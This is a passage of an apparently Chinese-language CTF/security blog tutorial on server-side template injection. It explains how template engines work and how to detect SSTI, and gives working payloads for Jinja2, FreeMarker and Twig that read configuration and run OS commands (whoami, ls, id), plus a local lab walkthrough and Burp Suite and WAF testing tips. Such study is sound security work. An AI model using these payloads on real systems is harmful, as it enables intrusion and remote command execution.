...
模板引擎用于分离用户界面与业务数据，生成特定格式的文档（如 HTML）。通过占位符（如 `{% raw %} {{ name }} {% endraw %}`）和控制语句（如 `{% raw %} {% if %} {% endraw %}`），模板引擎在运行时替换数据并执行逻辑，生成最终页面。模板引擎的优势包括：
...
- 示例：用户输入 `{% raw %} {{7*7}} {% endraw %}`，若返回 `49`，表明存在 SSTI 漏洞。

### 2.4 攻击流程

1. **寻找注入点**：通过输入框、URL 参数、表单等提交模板语法（如 `{% raw %} {{}} {% endraw %}`或 `{% raw %} {% %} {% endraw %}`）。
...
1. **信息收集**：
   ...
   - 提交测试 payload：`{% raw %} {{7*7}} {% endraw %}`或 `{% raw %} {% print(1+1) %} {% endraw %}`，观察是否被解析。
2. **了解模板引擎特性**：
...
2. **构造 payload**：
   ...
   - 读取配置：`{% raw %} {{ config }} {% endraw %}`
   - 执行命令：`{% raw %} {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('whoami').read() }} {% endraw %}`
...
2. **确认 SSTI 漏洞**：
   ...
   - 访问：`{% raw %} http://127.0.0.1:8088/unsafe?name={{7*7}} {% endraw %}`
   - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671227_6886e63b7e766a9804c50.jpeg)`
   - 输入的 `{% raw %} {{7*7}} {% endraw %}`被 Jinja2 解析并执行，表明存在 SSTI 漏洞。

3. **枚举 `__subclasses__()`查找 `subprocess.Popen`**：

   - **初步测试**：访问 `{% raw %} http://127.0.0.1:8088/unsafe?name={{[].__class__.__base__.__subclasses__()}} {% endraw %}`
...
- **Burp Suite**：使用 Intruder 模块批量测试 payload，结合 Decoder 进行编码转换。
  ...
  Payload 列表：`{% raw %} {{7*7}} {% endraw %}`, `{% raw %} {{config}} {% endraw %}`, `{% raw %} {{''.__class__}} {% endraw %}`等。
...
2. **逐步测试**：从简单 payload（如 `{% raw %} {{7*7}} {% endraw %}`）开始，逐步尝试复杂 payload，观察 WAF 响应（如 403、406）。
...
- **基本测试**：
  ...
  - 提交简单的数学表达式，如 `{% raw %} {{7*7}} {% endraw %}`或 ` {% raw %} {% print(1+1) %} {% endraw %}`，观察响应是否返回计算结果（如 `49`或 `2`）。
...
- **进阶测试**：
  ...
  - 测试模板引擎特定的内置对象或函数，例如：
    - Jinja2：`{% raw %} {{ config }} {% endraw %}`或 `{% raw %} {{ lipsum.__globals__ }} {% endraw %}`
    - FreeMarker：`{% raw %} ${"freemarker.template.utility.Execute"?new()("id")} {% endraw %}`
    - Twig：`{% raw %} {{ _self.env }} {% endraw %}`
...
- **Jinja2（Python）**：
  ...
  - **利用方式**：
    ...
    - 利用内置函数：`{% raw %} {{ lipsum.__globals__['os'].popen('ls').read() }} {% endraw %}`
...
- **Twig（PHP）**：
  ...
  - **利用方式**：
    ...
    - 访问配置：`{% raw %} {{ app.request.server.all() }} {% endraw %}`
...
- **步骤 1：确认模板引擎**：
  ...
  - 测试常见模板语法：
    - Jinja2：`{% raw %} {{7*7}} {% endraw %}`或 `{% raw %} {% print(1+1) %} {% endraw %}`
    - FreeMarker：`{% raw %} ${7*7} {% endraw %}`
    - Twig：`{% raw %} {{7*7}} {% endraw %}`或 `{% raw %} {% do 1+1 %} {% endraw %}`
  - 检查响应头、页面特征或错误信息，推测框架（如 Flask 通常使用 Jinja2）。

- **步骤 2：构造基础 payload**：

  - 读取配置：`{% raw %} {{ config }} {% endraw %}`（Jinja2）或 `{% raw %} {{ app.request.server.all() }} {% endraw %}`（Twig）。
  - 访问全局对象：`{% raw %} {{ lipsum.__globals__ }} {% endraw %}`（Jinja2）或 `{% raw %} ${"java.lang.Runtime"?new()} {% endraw %}`（FreeMarker）。
